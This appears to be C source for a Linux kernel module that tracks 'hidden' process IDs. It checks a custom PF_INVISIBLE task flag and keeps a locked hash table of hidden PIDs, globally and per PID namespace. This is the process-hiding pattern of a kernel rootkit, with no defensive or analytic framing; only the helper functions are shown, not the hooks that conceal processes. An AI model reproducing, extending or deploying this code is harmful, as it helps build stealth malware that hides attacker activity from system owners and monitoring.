#include "memd_proc.h"
#include "memd_hide.h"

int is_invisible(pid_t pid) {
    struct task_struct* task;
    if (!pid)
        return 0;
    task = find_task_by_vpid(pid);
    if (!task)
        return 0;
    if (task->flags & PF_INVISIBLE)
        return 1;
    return 0;
}

bool memd_hide_check_visibility(pid_t pid, struct pid_namespace *ns)
{
    if (!ns)
        ns = &init_pid_ns;
    return memd_hide_contains_ns(pid, ns);
}

int memd_hide_get_hidden_pids(pid_t *buf, size_t buf_size, size_t *count)
{
    if (!buf || !count)
        return -EINVAL;
    
    struct memd_hide_entry *entry;
    size_t copied = 0;
    
    *count = 0;
    
    spin_lock(&hide_lock);
    for (int i = 0; i < MEMD_HIDE_HASH_SIZE; i++) {
        hlist_for_each_entry(entry, &hide_hash[i], node) {
            if (copied < buf_size / sizeof(pid_t)) {
                buf[copied++] = entry->pid;
            }
        }
    }
    *count = copied;
    spin_unlock(&hide_lock);
    
    return 0;
}

int memd_hide_get_ns_hidden_pids(pid_t *buf, size_t buf_size, size_t *count, struct pid_namespace *ns)
{
    if (!buf || !count || !ns)
        return -EINVAL;
    
    struct memd_hide_entry *entry;
    size_t copied = 0;
    
    *count = 0;
    
    spin_lock(&hide_lock);
    for (int i = 0; i < MEMD_HIDE_HASH_SIZE; i++) {
        hlist_for_each_entry(entry, &hide_hash[i], node) {
            if (entry->ns == ns && copied < buf_size / sizeof(pid_t)) {
                buf[copied++] = entry->pid;
            }
        }
    }
    *count = copied;
    spin_unlock(&hide_lock);
    
    return 0;
}
